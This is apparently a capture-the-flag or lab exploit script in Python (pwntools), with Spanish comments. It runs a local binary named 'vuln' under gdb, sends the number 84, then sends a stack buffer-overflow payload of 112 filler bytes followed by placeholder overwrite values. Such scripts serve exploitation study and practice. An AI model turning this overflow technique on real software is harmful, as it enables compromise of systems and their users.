#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Crear proceso con gdb
p = gdb.debug('/workspace/vuln', '''
break *win+74
continue
''')

# El número correcto es 84
p.sendline(b'84')

# Esperar a la pregunta del nombre
p.recvuntil(b'Name? ')

# Enviar payload
payload = b'A' * 112 + b'BBBBBBBB' + b'CCCCCCCC'
p.sendline(payload)

p.interactive()
